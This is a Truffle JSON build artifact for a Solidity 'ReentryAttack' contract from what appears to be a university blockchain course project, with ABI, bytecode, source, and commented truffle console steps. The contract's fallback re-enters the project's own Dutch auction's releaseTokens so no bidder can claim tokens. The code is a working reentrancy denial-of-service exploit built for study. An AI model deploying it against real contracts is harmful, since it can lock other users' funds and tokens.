{
  "contractName": "ReentryAttack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "auctionAddress",
          "type": "address"
        },
        {
          "internalType": "address payable",
          "name": "tokenAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "auction",
      "outputs": [
        {
          "internalType": "contract Auction",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "token",
      "outputs": [
        {
          "internalType": "contract CypherpunkCoin",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "commit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdrawTokens",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516104ad3803806104ad8339818101604052604081101561003357600080fd5b810190808051906020019092919080519060200190929190505050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505061038c806101216000396000f3fe60806040526004361061004e5760003560e01c80633c7a3aff146100da5780633ccfd60b146100e45780637d9f6db5146100fb5780638d8f2adb1461013c578063fc0c546a14610153576100d5565b366100d55760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a96f86686040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100bb57600080fd5b505af11580156100cf573d6000803e3d6000fd5b50505050005b600080fd5b6100e2610194565b005b3480156100f057600080fd5b506100f961021f565b005b34801561010757600080fd5b5061011061028a565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561014857600080fd5b506101516102ae565b005b34801561015f57600080fd5b50610168610330565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633c7a3aff670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561020457600080fd5b505af1158015610218573d6000803e3d6000fd5b5050505050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610287573d6000803e3d6000fd5b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a96f86686040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561031657600080fd5b505af115801561032a573d6000803e3d6000fd5b50505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156fea264697066735822122054233ff8dfc9c60c69b1ae38aad17a1a67dd361b83fa5c8ab8f90038020fe08364736f6c634300060c0033",
  "immutableReferences": {},
  "source": "pragma solidity ^0.6.0;\r\n\r\nimport \"./Auction.sol\";\r\nimport \"./CypherpunkCoin.sol\";\r\n\r\n// the trick is try to become the last bidder and exploit releaseTokens as\r\n// it transfer ether to an external agent\r\n\r\n// this reentry attack will work with the auction\r\n// of startPrice = 3000, endingPrice = 2000 and supply = 200 in 5 minutes\r\n// here we attack the method releaseTokens\r\n// the amount of commit is 1 Eth, which makes demand higher than the supply\r\n// and this contract will be the last bidder\r\n// however, when others want to release the tokens, Auction contract\r\n// will have to pay this contract, and call the payable function, which\r\n// call release tokens again and generate errors\r\n// therefore, no one can claim the tokens because of this attack\r\ncontract ReentryAttack {\r\n    Auction public auction;\r\n    CypherpunkCoin public token;\r\n    address payable owner;\r\n\r\n    // we should send the money to the contract before doing the test\r\n    constructor(address auctionAddress, address payable tokenAddress) public {\r\n        auction = Auction(auctionAddress);\r\n        token = CypherpunkCoin(tokenAddress);\r\n        owner = msg.sender;\r\n    }\r\n\r\n    // contract commits to the auction\r\n    function commit() public payable {\r\n        auction.commit.value(\r\n            // auction.startPrice() * 10**12 * auction.tokenSupply()\r\n            1000000000000000000\r\n        )();\r\n    }\r\n\r\n    function withdrawTokens() public {\r\n        auction.releaseTokens();\r\n    }\r\n\r\n    function withdraw() external {\r\n        owner.transfer(address(this).balance);\r\n    }\r\n\r\n    // fallback function\r\n    receive() external payable {\r\n        auction.releaseTokens();\r\n    }\r\n}\r\n\r\n// these lines are instructions to attack\r\n// truffle migrate --reset\r\n// truffle console\r\n// cypherPunk = await CypherpunkCoin.deployed()\r\n// cypherPunk.createAuction(3000,2000,200,5)\r\n// auctionAddress = await cypherPunk.auctionAddress()\r\n// attack = await ReentryAttack.new(auctionAddress,cypherPunk.address)\r\n// cypherPunk.openCurrAuction()\r\n// auction = await Auction.at(auctionAddress)\r\n// auction.commit({value: 100000000000000000, from:accounts[1]}) // send from accounts[1]\r\n// attack.commit({value: 1000000000000000000})\r\n// auction.releaseTokens() --> can not release\r\n",
  "sourcePath": "F:/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/ReentryAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.6.12+commit.27d51765.Emscripten.clang"
  },
  "schemaVersion": "3.3.1",
  "updatedAt": "2020-11-03T15:44:57.168Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}